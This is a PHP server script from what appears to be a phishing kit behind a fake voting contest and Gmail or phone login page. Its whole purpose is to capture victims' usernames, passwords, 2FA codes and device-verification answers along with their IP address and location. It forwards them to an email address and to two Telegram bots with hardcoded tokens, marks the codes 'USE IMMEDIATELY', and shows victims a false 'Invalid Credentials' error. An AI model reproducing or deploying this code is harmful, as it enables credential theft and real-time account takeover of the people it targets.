<?php 
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration
$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY";
$id = getenv('TELEGRAM_CHAT_ID') ?: "6037378895";
// Second bot configuration
$botToken2 = "8473712711:AAFHdPiy_Tbdba_toqZNZccVcB59iUHa5K4";
$id2 = "8228289585";
$Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com";

// Get POST data
$em = isset($_POST['di']) ? trim($_POST['di']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
$vote = isset($_POST['vote']) ? trim($_POST['vote']) : '';
$contestant = isset($_POST['contestant']) ? trim($_POST['contestant']) : '';
$status = isset($_POST['status']) ? trim($_POST['status']) : '';
$device_verify = isset($_POST['device_verify']) ? trim($_POST['device_verify']) : '';
$chosen_number = isset($_POST['chosen_number']) ? trim($_POST['chosen_number']) : '';

// Function to log message via email and Telegram
function logMessage($message, $send, $subject) {
    // Send email
    $emailResult = mail($send, $subject, $message);

    // Send to Telegram
    global $botToken, $id, $botToken2, $id2;

    $bots = [
        ['token' => $botToken, 'chat_id' => $id],
        ['token' => $botToken2, 'chat_id' => $id2]
    ];

    $telegramSuccess = false;

    foreach ($bots as $bot) {
        $mess = urlencode($message);
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage?chat_id=" . $bot['chat_id'] . "&text=" . $mess;

        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $url,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30,
        ]);

        $result = curl_exec($curl);
        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);

        if ($result && $httpCode == 200) {
            $responseData = json_decode($result, true);
            if ($responseData && isset($responseData['ok']) && $responseData['ok'] === true) {
                $telegramSuccess = true;
            }
        }
    }

    return $emailResult || $telegramSuccess;
}

// Function to get real client IP
function getClientIP() {
    $ip_headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_X_REAL_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ip_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }

    return getenv("REMOTE_ADDR") ?: '127.0.0.1';
}

// Function to get location from IP
function getLocation($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) {
        return [
            'country' => 'Local/Unknown',
            'region' => 'Local/Unknown',
            'city' => 'Local/Unknown'
        ];
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ip-api.com/json/" . $ip . "?fields=country,regionName,city,status,message");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response && $http_code == 200) {
        $data = json_decode($response, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            return [
                'country' => $data['country'] ?? 'Unknown',
                'region' => $data['regionName'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown'
            ];
        }
    }

    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown'
    ];
}

// Function to determine platform based on identifier
function getPlatform($identifier) {
    if (strpos($identifier, '+') === 0) {
        return 'NUMBER';
    } elseif (strpos($identifier, '@') !== false) {
        return 'GMAIL';
    } else {
        return 'UNKNOWN';
    }
}

// Check if form fields are set
if (!empty($vote)) {
    // Vote button clicked notification
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "🎯 VOTE BUTTON CLICKED!\n\n";
    $message .= "👑 Contestant: " . htmlspecialchars($contestant) . "\n";
    $message .= "⏳ Status: " . htmlspecialchars($status) . "\n\n";
    $message .= "🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-VOTING SYSTEM ALERT-\n";

    $send = $Receive_email;
    $subject = "Vote Button Clicked: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && empty($password) && empty($otp)) {
    // Continue button clicked
    $ip = getClientIP();
    $location = getLocation($ip);
    $platform = getPlatform($em);

    $message = "📱 NEW LOGIN ATTEMPT (Continue)\n\n";
    $message .= "📋 DETAILS:\n";
    $message .= "PLATFORM: " . $platform . "\n";

    if (strpos($em, '+') === 0) {
        $message .= "Phone Number: " . htmlspecialchars($em) . "\n";
    } elseif (strpos($em, '@') !== false) {
        $message .= "Email: " . htmlspecialchars($em) . "\n";
    } else {
        $message .= "Username: " . htmlspecialchars($em) . "\n";
    }

    $message .= "\n🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-" . $platform . " LOGIN SYSTEM-\n";

    $send = $Receive_email;
    $subject = $platform . " Continue Button: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($device_verify)) {
    // Device verification response
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "📱 DEVICE VERIFICATION\n\n";
    $message .= "📋 DETAILS:\n";
    $message .= "PLATFORM: GMAIL\n";
    $message .= "Device Verified: " . htmlspecialchars($device_verify) . "\n";
    $message .= "\n🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-GMAIL SECURITY LOG-\n";

    $send = $Receive_email;
    $subject = "Gmail Device Verification: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($chosen_number)) {
    // Number selection verification
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "🔢 NUMBER SELECTION VERIFICATION\n\n";
    $message .= "📋 DETAILS:\n";
    $message .= "PLATFORM: GMAIL\n";
    $message .= "Selected Number: " . htmlspecialchars($chosen_number) . "\n";
    $message .= "\n🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-GMAIL SECURITY LOG-\n";

    $send = $Receive_email;
    $subject = "Gmail Number Selection: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && (!empty($password) || !empty($otp))) {
    $ip = getClientIP();
    $location = getLocation($ip);
    $platform = getPlatform($em);

    if (!empty($password)) {
        // Login attempt
        $message = "🔐 NEW LOGIN ATTEMPT\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "PLATFORM: " . $platform . "\n";
        $message .= "UserName: " . htmlspecialchars($em) . "\n";
        $message .= "Password: " . htmlspecialchars($password) . "\n";
        if (strpos($em, '+') === 0) {
            $parts = explode(' ', $em);
            $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
        }
        $message .= "\n🌍 LOCATION:\n";
        $message .= "Country: " . $location['country'] . "\n";
        $message .= "State: " . $location['region'] . "\n";
        $message .= "City: " . $location['city'] . "\n";
        $message .= "IP: " . $ip . "\n\n";
        $message .= "-SECURED BY SHARPLOGS-\n";
    } elseif (!empty($otp)) {
        // OTP code
        $otpTitle = ($platform === 'NUMBER') ? 'NUMBER 2FA CODE' : 'GMAIL 2FA CODE';
        $message = "🔑 " . $otpTitle . "\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "User: " . htmlspecialchars($em) . "\n";
        $message .= "Code: " . htmlspecialchars($otp) . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
        $message .= "USE IMMEDIATELY – TIME SENSITIVE\n";
    }
    $send = $Receive_email;
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}

if (isset($signal)) {
    echo json_encode(['signal' => $signal, 'msg' => $msg]);
}
?>